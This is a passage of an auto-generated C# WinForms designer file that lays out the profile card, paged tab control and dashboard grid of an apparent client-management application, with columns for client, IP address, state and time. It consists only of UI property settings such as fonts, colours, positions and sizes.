        this.bunifuLabel74.TabIndex = 579;
        this.bunifuLabel74.Text = "Measure software performance against your computer\'s capabilities";
        this.bunifuLabel74.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel74.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // bunifuLabel67
        // 
        this.bunifuLabel67.AllowParentOverrides = false;
        this.bunifuLabel67.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuLabel67.AutoEllipsis = false;
        this.bunifuLabel67.CursorType = null;
        this.bunifuLabel67.Font = new System.Drawing.Font("Segoe UI Semibold", 10F, System.Drawing.FontStyle.Bold);
        this.bunifuLabel67.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
        this.bunifuLabel67.Location = new System.Drawing.Point(-329, 11);
        this.bunifuLabel67.Name = "bunifuLabel67";
        this.bunifuLabel67.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel67.Size = new System.Drawing.Size(77, 17);
        this.bunifuLabel67.TabIndex = 578;
        this.bunifuLabel67.Text = "performance";
        this.bunifuLabel67.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel67.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // ValueMunePerformince
        // 
        this.ValueMunePerformince.AllowParentOverrides = false;
        this.ValueMunePerformince.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.ValueMunePerformince.AutoEllipsis = false;
        this.ValueMunePerformince.AutoSize = false;
        this.ValueMunePerformince.CursorType = null;
        this.ValueMunePerformince.Font = new System.Drawing.Font("Arial Black", 42F, System.Drawing.FontStyle.Bold);
        this.ValueMunePerformince.ForeColor = System.Drawing.Color.White;
        this.ValueMunePerformince.Location = new System.Drawing.Point(19, 130);
        this.ValueMunePerformince.Name = "ValueMunePerformince";
        this.ValueMunePerformince.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.ValueMunePerformince.Size = new System.Drawing.Size(199, 79);
        this.ValueMunePerformince.TabIndex = 577;
        this.ValueMunePerformince.Text = "0%";
        this.ValueMunePerformince.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.ValueMunePerformince.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // bunifuLabel71
        // 
        this.bunifuLabel71.AllowParentOverrides = false;
        this.bunifuLabel71.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuLabel71.AutoEllipsis = false;
        this.bunifuLabel71.AutoSize = false;
        this.bunifuLabel71.CursorType = null;
        this.bunifuLabel71.Font = new System.Drawing.Font("Segoe UI Semibold", 10.75F, System.Drawing.FontStyle.Bold);
        this.bunifuLabel71.ForeColor = System.Drawing.Color.White;
        this.bunifuLabel71.Location = new System.Drawing.Point(-433, 46);
        this.bunifuLabel71.Name = "bunifuLabel71";
        this.bunifuLabel71.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel71.Size = new System.Drawing.Size(55, 17);
        this.bunifuLabel71.TabIndex = 576;
        this.bunifuLabel71.Text = "97%";
        this.bunifuLabel71.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel71.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // ProfileDate
        // 
        this.ProfileDate.AllowParentOverrides = false;
        this.ProfileDate.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.ProfileDate.AutoEllipsis = false;
        this.ProfileDate.AutoSize = false;
        this.ProfileDate.Cursor = System.Windows.Forms.Cursors.Default;
        this.ProfileDate.CursorType = System.Windows.Forms.Cursors.Default;
        this.ProfileDate.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.ProfileDate.ForeColor = System.Drawing.SystemColors.ControlText;
        this.ProfileDate.Location = new System.Drawing.Point(18, 261);
        this.ProfileDate.Name = "ProfileDate";
        this.ProfileDate.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.ProfileDate.Size = new System.Drawing.Size(300, 19);
        this.ProfileDate.TabIndex = 594;
        this.ProfileDate.Text = "0000-00-00";
        this.ProfileDate.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.ProfileDate.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // BrowserLogo
        // 
        this.BrowserLogo.Animated = true;
        this.BrowserLogo.BackColor = System.Drawing.Color.Transparent;
        this.BrowserLogo.BorderRadius = 15;
        this.BrowserLogo.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(159)))), ((int)(((byte)(67)))));
        this.BrowserLogo.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(159)))), ((int)(((byte)(67)))));
        this.BrowserLogo.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(159)))), ((int)(((byte)(67)))));
        this.BrowserLogo.CheckedState.Parent = this.BrowserLogo;
        this.BrowserLogo.Cursor = System.Windows.Forms.Cursors.Hand;
        this.BrowserLogo.CustomImages.Parent = this.BrowserLogo;
        this.BrowserLogo.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.BrowserLogo.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(244)))), ((int)(((byte)(250)))));
        this.BrowserLogo.Font = new System.Drawing.Font("Consolas", 9.25F, System.Drawing.FontStyle.Bold);
        this.BrowserLogo.ForeColor = System.Drawing.Color.White;
        this.BrowserLogo.HoverState.Parent = this.BrowserLogo;
        this.BrowserLogo.Image = ((System.Drawing.Image)(resources.GetObject("BrowserLogo.Image")));
        this.BrowserLogo.ImageSize = new System.Drawing.Size(24, 24);
        this.BrowserLogo.Location = new System.Drawing.Point(226, 47);
        this.BrowserLogo.Name = "BrowserLogo";
        this.BrowserLogo.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(192)))));
        this.BrowserLogo.PressedDepth = 50;
        this.BrowserLogo.ShadowDecoration.Parent = this.BrowserLogo;
        this.BrowserLogo.Size = new System.Drawing.Size(30, 30);
        this.BrowserLogo.TabIndex = 593;
        this.BrowserLogo.Click += new System.EventHandler(this.BrowserLogo_Click);
        // 
        // LevelProfile
        // 
        this.LevelProfile.BackColor = System.Drawing.Color.White;
        this.LevelProfile.BorderColor = System.Drawing.Color.Gray;
        this.LevelProfile.FillColor = System.Drawing.Color.Gray;
        this.LevelProfile.FocusedColor = System.Drawing.Color.Gray;
        this.LevelProfile.Location = new System.Drawing.Point(107, 224);
        this.LevelProfile.Name = "LevelProfile";
        this.LevelProfile.RatingColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
        this.LevelProfile.Size = new System.Drawing.Size(120, 29);
        this.LevelProfile.TabIndex = 592;
        // 
        // bunifuLabel_2
        // 
        this.bunifuLabel_2.AllowParentOverrides = false;
        this.bunifuLabel_2.AutoEllipsis = false;
        this.bunifuLabel_2.AutoSize = false;
        this.bunifuLabel_2.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel_2.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel_2.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.bunifuLabel_2.ForeColor = System.Drawing.Color.Gray;
        this.bunifuLabel_2.Location = new System.Drawing.Point(18, 201);
        this.bunifuLabel_2.Name = "bunifuLabel_2";
        this.bunifuLabel_2.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel_2.Size = new System.Drawing.Size(300, 17);
        this.bunifuLabel_2.TabIndex = 591;
        this.bunifuLabel_2.Text = "Silver@gimal.com";
        this.bunifuLabel_2.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.bunifuLabel_2.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // ProfileUsername
        // 
        this.ProfileUsername.AllowParentOverrides = false;
        this.ProfileUsername.AutoEllipsis = false;
        this.ProfileUsername.AutoSize = false;
        this.ProfileUsername.BackColor = System.Drawing.Color.White;
        this.ProfileUsername.CursorType = null;
        this.ProfileUsername.Font = new System.Drawing.Font("Segoe UI Semibold", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.ProfileUsername.ForeColor = System.Drawing.Color.Black;
        this.ProfileUsername.Location = new System.Drawing.Point(18, 173);
        this.ProfileUsername.Name = "ProfileUsername";
        this.ProfileUsername.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.ProfileUsername.Size = new System.Drawing.Size(300, 21);
        this.ProfileUsername.TabIndex = 590;
        this.ProfileUsername.Text = "Username";
        this.ProfileUsername.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.ProfileUsername.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // ImageProfileMune
        // 
        this.ImageProfileMune.BackColor = System.Drawing.Color.Transparent;
        this.ImageProfileMune.Controls.Add(this.guna2CircleButton_0);
        this.ImageProfileMune.FillColor = System.Drawing.Color.White;
        this.ImageProfileMune.FillOffset = 12;
        this.ImageProfileMune.FillThickness = 1;
        this.ImageProfileMune.Font = new System.Drawing.Font("Consolas", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.ImageProfileMune.ForeColor = System.Drawing.Color.White;
        this.ImageProfileMune.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
        this.ImageProfileMune.Image = ((System.Drawing.Image)(resources.GetObject("ImageProfileMune.Image")));
        this.ImageProfileMune.ImageSize = new System.Drawing.Size(90, 90);
        this.ImageProfileMune.Location = new System.Drawing.Point(110, 46);
        this.ImageProfileMune.Name = "ImageProfileMune";
        this.ImageProfileMune.ProgressColor = System.Drawing.Color.FromArgb(((int)(((byte)(121)))), ((int)(((byte)(24)))), ((int)(((byte)(157)))));
        this.ImageProfileMune.ProgressColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(24)))), ((int)(((byte)(157)))));
        this.ImageProfileMune.ProgressOffset = 8;
        this.ImageProfileMune.ProgressThickness = 6;
        this.ImageProfileMune.ShadowDecoration.Parent = this.ImageProfileMune;
        this.ImageProfileMune.Size = new System.Drawing.Size(120, 120);
        this.ImageProfileMune.TabIndex = 589;
        this.ImageProfileMune.Value = 100;
        // 
        // guna2CircleButton_0
        // 
        this.guna2CircleButton_0.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.guna2CircleButton_0.CheckedState.Parent = this.guna2CircleButton_0;
        this.guna2CircleButton_0.Cursor = System.Windows.Forms.Cursors.Hand;
        this.guna2CircleButton_0.CustomImages.Parent = this.guna2CircleButton_0;
        this.guna2CircleButton_0.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(192)))), ((int)(((byte)(0)))));
        this.guna2CircleButton_0.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.guna2CircleButton_0.ForeColor = System.Drawing.Color.White;
        this.guna2CircleButton_0.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(237)))), ((int)(((byte)(107)))), ((int)(((byte)(96)))));
        this.guna2CircleButton_0.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(237)))), ((int)(((byte)(107)))), ((int)(((byte)(96)))));
        this.guna2CircleButton_0.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(237)))), ((int)(((byte)(107)))), ((int)(((byte)(96)))));
        this.guna2CircleButton_0.HoverState.Parent = this.guna2CircleButton_0;
        this.guna2CircleButton_0.Location = new System.Drawing.Point(93, 6);
        this.guna2CircleButton_0.Name = "guna2CircleButton_0";
        this.guna2CircleButton_0.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.guna2CircleButton_0.ShadowDecoration.Parent = this.guna2CircleButton_0;
        this.guna2CircleButton_0.Size = new System.Drawing.Size(13, 13);
        this.guna2CircleButton_0.TabIndex = 580;
        // 
        // PanelResizeForm
        // 
        this.PanelResizeForm.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.PanelResizeForm.Controls.Add(this.PageForm);
        this.PanelResizeForm.Location = new System.Drawing.Point(64, 79);
        this.PanelResizeForm.Name = "PanelResizeForm";
        this.PanelResizeForm.Size = new System.Drawing.Size(952, 513);
        this.PanelResizeForm.TabIndex = 607;
        // 
        // PageForm
        // 
        this.PageForm.Alignment = System.Windows.Forms.TabAlignment.Bottom;
        this.PageForm.AllowTransitions = false;
        this.PageForm.Controls.Add(this.Page1);
        this.PageForm.Controls.Add(this.Page2);
        this.PageForm.Controls.Add(this.Page3);
        this.PageForm.Controls.Add(this.Page4);
        this.PageForm.Controls.Add(this.Page5);
        this.PageForm.Controls.Add(this.Page6);
        this.PageForm.Controls.Add(this.Page7);
        this.PageForm.Controls.Add(this.PageSocketPort);
        this.PageForm.Dock = System.Windows.Forms.DockStyle.Fill;
        this.PageForm.Location = new System.Drawing.Point(0, 0);
        this.PageForm.Multiline = true;
        this.PageForm.Name = "PageForm";
        this.PageForm.Page = this.Page5;
        this.PageForm.PageIndex = 4;
        this.PageForm.PageName = "Page5";
        this.PageForm.PageTitle = "PageBuilder";
        this.PageForm.SelectedIndex = 0;
        this.PageForm.Size = new System.Drawing.Size(952, 513);
        this.PageForm.TabIndex = 605;
        animation2.AnimateOnlyDifferences = false;
        animation2.BlindCoeff = ((System.Drawing.PointF)(resources.GetObject("animation2.BlindCoeff")));
        animation2.LeafCoeff = 0F;
        animation2.MaxTime = 1F;
        animation2.MinTime = 0F;
        animation2.MosaicCoeff = ((System.Drawing.PointF)(resources.GetObject("animation2.MosaicCoeff")));
        animation2.MosaicShift = ((System.Drawing.PointF)(resources.GetObject("animation2.MosaicShift")));
        animation2.MosaicSize = 0;
        animation2.Padding = new System.Windows.Forms.Padding(0);
        animation2.RotateCoeff = 0F;
        animation2.RotateLimit = 0F;
        animation2.ScaleCoeff = ((System.Drawing.PointF)(resources.GetObject("animation2.ScaleCoeff")));
        animation2.SlideCoeff = ((System.Drawing.PointF)(resources.GetObject("animation2.SlideCoeff")));
        animation2.TimeCoeff = 0F;
        animation2.TransparencyCoeff = 0F;
        this.PageForm.Transition = animation2;
        this.PageForm.TransitionType = Utilities.BunifuPages.BunifuAnimatorNS.AnimationType.Custom;
        this.PageForm.SelectedIndexChanged += new System.EventHandler(this.PageForm_SelectedIndexChanged);
        this.PageForm.Selected += new System.Windows.Forms.TabControlEventHandler(this.PageForm_Selected);
        // 
        // Page1
        // 
        this.Page1.BackColor = System.Drawing.Color.White;
        this.Page1.Controls.Add(this.PanelDashboard);
        this.Page1.Location = new System.Drawing.Point(4, 4);
        this.Page1.Name = "Page1";
        this.Page1.Padding = new System.Windows.Forms.Padding(3);
        this.Page1.Size = new System.Drawing.Size(944, 487);
        this.Page1.TabIndex = 0;
        this.Page1.Text = "PageDashboard";
        // 
        // PanelDashboard
        // 
        this.PanelDashboard.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.PanelDashboard.Controls.Add(this.bunifuGradientPanel2);
        this.PanelDashboard.Controls.Add(this.bunifuGradientPanel3);
        this.PanelDashboard.Controls.Add(this.bunifuPanel5);
        this.PanelDashboard.Controls.Add(this.bunifuPanel11);
        this.PanelDashboard.Controls.Add(this.bunifuGradientPanel1);
        this.PanelDashboard.Controls.Add(this.bunifuPanel4);
        this.PanelDashboard.Controls.Add(this.bunifuPanel3);
        this.PanelDashboard.Controls.Add(this.bunifuPanel2);
        this.PanelDashboard.Controls.Add(this.bunifuPanel6);
        this.PanelDashboard.Controls.Add(this.bunifuPanel1);
        this.PanelDashboard.Location = new System.Drawing.Point(3, 3);
        this.PanelDashboard.Name = "PanelDashboard";
        this.PanelDashboard.Size = new System.Drawing.Size(938, 481);
        this.PanelDashboard.TabIndex = 0;
        // 
        // bunifuGradientPanel2
        // 
        this.bunifuGradientPanel2.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.bunifuGradientPanel2.BackColor = System.Drawing.Color.Transparent;
        this.bunifuGradientPanel2.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuGradientPanel2.BackgroundImage")));
        this.bunifuGradientPanel2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuGradientPanel2.BorderRadius = 30;
        this.bunifuGradientPanel2.Controls.Add(this.label6);
        this.bunifuGradientPanel2.Controls.Add(this.bunifuSeparator3);
        this.bunifuGradientPanel2.Controls.Add(this.ListDashboard);
        this.bunifuGradientPanel2.GradientBottomLeft = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuGradientPanel2.GradientBottomRight = System.Drawing.Color.FromArgb(((int)(((byte)(135)))), ((int)(((byte)(16)))), ((int)(((byte)(255)))));
        this.bunifuGradientPanel2.GradientTopLeft = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.bunifuGradientPanel2.GradientTopRight = System.Drawing.Color.FromArgb(((int)(((byte)(135)))), ((int)(((byte)(16)))), ((int)(((byte)(255)))));
        this.bunifuGradientPanel2.Location = new System.Drawing.Point(17, 265);
        this.bunifuGradientPanel2.Name = "bunifuGradientPanel2";
        this.bunifuGradientPanel2.Quality = 10;
        this.bunifuGradientPanel2.Size = new System.Drawing.Size(482, 210);
        this.bunifuGradientPanel2.TabIndex = 598;
        // 
        // label6
        // 
        this.label6.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
        this.label6.AutoSize = true;
        this.label6.BackColor = System.Drawing.Color.Transparent;
        this.label6.Font = new System.Drawing.Font("Segoe UI", 8.75F, System.Drawing.FontStyle.Bold);
        this.label6.ForeColor = System.Drawing.Color.White;
        this.label6.Location = new System.Drawing.Point(10, -48);
        this.label6.Name = "label6";
        this.label6.Size = new System.Drawing.Size(73, 15);
        this.label6.TabIndex = 587;
        this.label6.Text = "Logs Details";
        // 
        // bunifuSeparator3
        // 
        this.bunifuSeparator3.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.bunifuSeparator3.BackColor = System.Drawing.Color.White;
        this.bunifuSeparator3.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuSeparator3.BackgroundImage")));
        this.bunifuSeparator3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuSeparator3.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
        this.bunifuSeparator3.LineColor = System.Drawing.Color.Silver;
        this.bunifuSeparator3.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.Solid;
        this.bunifuSeparator3.LineThickness = 1;
        this.bunifuSeparator3.Location = new System.Drawing.Point(17, 40);
        this.bunifuSeparator3.Name = "bunifuSeparator3";
        this.bunifuSeparator3.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
        this.bunifuSeparator3.Size = new System.Drawing.Size(446, 5);
        this.bunifuSeparator3.TabIndex = 586;
        // 
        // ListDashboard
        // 
        this.ListDashboard.AllowUserToAddRows = false;
        this.ListDashboard.AllowUserToDeleteRows = false;
        this.ListDashboard.AllowUserToResizeColumns = false;
        this.ListDashboard.AllowUserToResizeRows = false;
        dataGridViewCellStyle4.BackColor = System.Drawing.Color.White;
        this.ListDashboard.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle4;
        this.ListDashboard.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.ListDashboard.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
        this.ListDashboard.BackgroundColor = System.Drawing.Color.White;
        this.ListDashboard.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListDashboard.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListDashboard.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListDashboard.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle5.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle5.Font = new System.Drawing.Font("Segoe UI Semibold", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        dataGridViewCellStyle5.ForeColor = System.Drawing.Color.Gray;
        dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.White;
        dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.Gray;
        dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListDashboard.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle5;
        this.ListDashboard.ColumnHeadersHeight = 30;
        this.ListDashboard.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListDashboard.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.dataGridViewImageColumn1,
            this.dataGridViewTextBoxColumn1,
            this.dataGridViewTextBoxColumn6,
            this.dataGridViewTextBoxColumn8,
            this.dataGridViewTextBoxColumn13});
        dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle8.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle8.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        dataGridViewCellStyle8.ForeColor = System.Drawing.Color.Gray;
        dataGridViewCellStyle8.SelectionBackColor = System.Drawing.Color.White;
        dataGridViewCellStyle8.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListDashboard.DefaultCellStyle = dataGridViewCellStyle8;
        this.ListDashboard.EnableHeadersVisualStyles = false;
        this.ListDashboard.GridColor = System.Drawing.Color.White;
        this.ListDashboard.Location = new System.Drawing.Point(16, 15);
        this.ListDashboard.Name = "ListDashboard";
        this.ListDashboard.ReadOnly = true;
        this.ListDashboard.RowHeadersVisible = false;
        this.ListDashboard.RowHeadersWidth = 27;
        this.ListDashboard.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
        this.ListDashboard.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListDashboard.Size = new System.Drawing.Size(450, 183);
        this.ListDashboard.TabIndex = 486;
        this.ListDashboard.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.LightGrid;
        this.ListDashboard.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.White;
        this.ListDashboard.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListDashboard.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListDashboard.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListDashboard.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListDashboard.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListDashboard.ThemeStyle.GridColor = System.Drawing.Color.White;
        this.ListDashboard.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.White;
        this.ListDashboard.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListDashboard.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI Semibold", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.ListDashboard.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Gray;
        this.ListDashboard.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListDashboard.ThemeStyle.HeaderStyle.Height = 30;
        this.ListDashboard.ThemeStyle.ReadOnly = true;
        this.ListDashboard.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListDashboard.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListDashboard.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        this.ListDashboard.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Gray;
        this.ListDashboard.ThemeStyle.RowsStyle.Height = 22;
        this.ListDashboard.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.White;
        this.ListDashboard.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.Black;
        // 
        // dataGridViewImageColumn1
        // 
        this.dataGridViewImageColumn1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle6.NullValue = null;
        dataGridViewCellStyle6.Padding = new System.Windows.Forms.Padding(4);
        this.dataGridViewImageColumn1.DefaultCellStyle = dataGridViewCellStyle6;
        this.dataGridViewImageColumn1.HeaderText = "Client";
        this.dataGridViewImageColumn1.Name = "dataGridViewImageColumn1";
        this.dataGridViewImageColumn1.ReadOnly = true;
        this.dataGridViewImageColumn1.Width = 41;
        // 
        // dataGridViewTextBoxColumn1
        // 
        this.dataGridViewTextBoxColumn1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        this.dataGridViewTextBoxColumn1.HeaderText = "";
        this.dataGridViewTextBoxColumn1.Name = "dataGridViewTextBoxColumn1";
        this.dataGridViewTextBoxColumn1.ReadOnly = true;
        // 
        // dataGridViewTextBoxColumn6
        // 
        this.dataGridViewTextBoxColumn6.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        this.dataGridViewTextBoxColumn6.HeaderText = "IP Address";
        this.dataGridViewTextBoxColumn6.Name = "dataGridViewTextBoxColumn6";
        this.dataGridViewTextBoxColumn6.ReadOnly = true;
        // 
        // dataGridViewTextBoxColumn8
        // 
        this.dataGridViewTextBoxColumn8.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        this.dataGridViewTextBoxColumn8.HeaderText = "State";
        this.dataGridViewTextBoxColumn8.Name = "dataGridViewTextBoxColumn8";
        this.dataGridViewTextBoxColumn8.ReadOnly = true;
        // 
        // dataGridViewTextBoxColumn13
        // 
        this.dataGridViewTextBoxColumn13.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        dataGridViewCellStyle7.Format = "T";
        dataGridViewCellStyle7.NullValue = null;
        this.dataGridViewTextBoxColumn13.DefaultCellStyle = dataGridViewCellStyle7;
        this.dataGridViewTextBoxColumn13.HeaderText = "Time";
        this.dataGridViewTextBoxColumn13.Name = "dataGridViewTextBoxColumn13";
        this.dataGridViewTextBoxColumn13.ReadOnly = true;
        // 
        // bunifuGradientPanel3
        // 
        this.bunifuGradientPanel3.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.bunifuGradientPanel3.BackColor = System.Drawing.Color.Transparent;
        this.bunifuGradientPanel3.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuGradientPanel3.BackgroundImage")));
        this.bunifuGradientPanel3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuGradientPanel3.BorderRadius = 30;
        this.bunifuGradientPanel3.Controls.Add(this.pictureBox9);
        this.bunifuGradientPanel3.Controls.Add(this.CountReceivedData);
        this.bunifuGradientPanel3.Controls.Add(this.ProgressBarReceivedData);
        this.bunifuGradientPanel3.Controls.Add(this.bunifuLabel95);
        this.bunifuGradientPanel3.Controls.Add(this.CountSentData);
        this.bunifuGradientPanel3.Controls.Add(this.ProgressBarDataSent);
        this.bunifuGradientPanel3.Controls.Add(this.bunifuLabel14);
